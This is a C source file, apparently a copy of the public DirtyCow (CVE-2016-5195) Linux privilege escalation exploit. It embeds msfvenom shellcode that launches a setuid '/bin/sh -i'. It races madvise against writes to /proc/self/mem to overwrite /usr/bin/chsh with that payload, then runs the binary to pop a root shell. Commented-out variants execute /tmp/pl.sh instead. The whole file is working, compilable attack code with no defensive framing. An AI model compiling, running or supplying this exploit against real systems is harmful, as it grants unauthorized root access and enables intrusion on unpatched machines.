//gcc dc.c -pthread -o dc
//https://www.exploit-db.com/exploits/40616/
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void* map;
int ff;
int stop=0;
struct stat st;
char* name;
pthread_t pth1,pth2,pth3;
char suid_binary[]="/usr/bin/chsh";

//msfvenom -p linux/x86/exec CMD="/bin/sh -i" PrependSetuid=True -f elf|xxd -i
/*unsigned char sc[]=
{
	0x7f,0x45,0x4c,0x46,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x02,0x00,0x03,0x00,0x01,0x00,0x00,0x00,
	0x54,0x80,0x04,0x08,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x34,0x00,0x20,0x00,0x01,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x80,0x04,0x08,0x00,0x80,0x04,0x08,0x89,0x00,0x00,0x00,
	0xbe,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x10,0x00,0x00,
	0x31,0xdb,0x6a,0x17,0x58,0xcd,0x80,0x6a,0x0b,0x58,0x99,0x52,
	0x66,0x68,0x2d,0x63,0x89,0xe7,0x68,0x2f,0x73,0x68,0x00,0x68,
	0x2f,0x62,0x69,0x6e,0x89,0xe3,0x52,0xe8,0x0b,0x00,0x00,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x20,0x2d,0x69,0x00,0x57,
	0x53,0x89,0xe1,0xcd,0x80
};
unsigned int sc_len=137;*/

//msfvenom -p linux/x64/exec CMD="/bin/sh -i" PrependSetuid=True -f elf|xxd -i
unsigned char sc[]=
{
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,
	0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb2,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xec,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,
	0x48,0x31,0xff,0x6a,0x69,0x58,0x0f,0x05,0x6a,0x3b,0x58,0x99,
	0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,
	0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,
	0x0b,0x00,0x00,0x00,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x20,
	0x2d,0x69,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05
};
unsigned int sc_len=178;

//msfvenom -p linux/x64/exec CMD=/tmp/pl.sh PrependSetuid=True -f elf|xxd -i
/*unsigned char sc[]=
{
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,
	0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb2,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xec,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,
	0x48,0x31,0xff,0x6a,0x69,0x58,0x0f,0x05,0x6a,0x3b,0x58,0x99,
	0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,
	0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,
	0x0b,0x00,0x00,0x00,0x2f,0x74,0x6d,0x70,0x2f,0x70,0x6c,0x2e,
	0x73,0x68,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05
};
unsigned int sc_len=178;*/

//msfvenom -p linux/x86/exec CMD=/tmp/pl.sh PrependSetuid=True -f elf|xxd -i
/*unsigned char sc[]=
{
	0x7f,0x45,0x4c,0x46,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x02,0x00,0x03,0x00,0x01,0x00,0x00,0x00,
	0x54,0x80,0x04,0x08,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x34,0x00,0x20,0x00,0x01,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x80,0x04,0x08,0x00,0x80,0x04,0x08,0x89,0x00,0x00,0x00,
	0xbe,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x10,0x00,0x00,
	0x31,0xdb,0x6a,0x17,0x58,0xcd,0x80,0x6a,0x0b,0x58,0x99,0x52,
	0x66,0x68,0x2d,0x63,0x89,0xe7,0x68,0x2f,0x73,0x68,0x00,0x68,
	0x2f,0x62,0x69,0x6e,0x89,0xe3,0x52,0xe8,0x0b,0x00,0x00,0x00,
	0x2f,0x74,0x6d,0x70,0x2f,0x70,0x6c,0x2e,0x73,0x68,0x00,0x57,
	0x53,0x89,0xe1,0xcd,0x80
};
unsigned int sc_len=137;*/

void* madviseThread(void* arg)
{
	char* str=(char*)arg;
	int ii,cc=0;
	for(ii=0;ii<1000000&&!stop;++ii)
		cc+=madvise(map,100,MADV_DONTNEED);
	printf("thread stopped\n");
}

void* procselfmemThread(void* arg)
{
	char* str=(char*)arg;
	int ff=open("/proc/self/mem",O_RDWR);
	int ii,cc=0;
	for(ii=0;ii<1000000&&!stop;++ii)
	{
		lseek(ff,(__off_t)map,SEEK_SET);
		cc+=write(ff,str,sc_len);
	}
	printf("thread stopped\n");
}

void* waitForWrite(void* arg)
{
	char buf[sc_len];
	while(1)
	{
		FILE* fp=fopen(suid_binary,"rb");
		fread(buf,sc_len,1,fp);
		if(memcmp(buf,sc,sc_len)==0)
		{
			printf("%s overwritten\n",suid_binary);
			break;
		}
		fclose(fp);
		sleep(1);
	}
	stop=1;
	printf("Popping root shell.\n");
	printf("Don't forget to restore /tmp/bak\n");
	system(suid_binary);
}

int main(int argc,char* argv[])
{
	char* backup;
	printf("DirtyCow root privilege escalation\n");
	printf("Backing up %s to /tmp/bak\n",suid_binary);
	asprintf(&backup,"cp %s /tmp/bak",suid_binary);
	system(backup);
	ff=open(suid_binary,O_RDONLY);
	fstat(ff,&st);
	printf("Size of binary: %d\n",(int)st.st_size);
	char payload[st.st_size];
	memset(payload,0x90,st.st_size);
	memcpy(payload,sc,sc_len+1);
	map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,ff,0);
	printf("Racing,this may take a while..\n");
	pthread_create(&pth1,NULL,&madviseThread,suid_binary);
	pthread_create(&pth2,NULL,&procselfmemThread,payload);
	pthread_create(&pth3,NULL,&waitForWrite,NULL);
	pthread_join(pth3,NULL);
	return 0;
}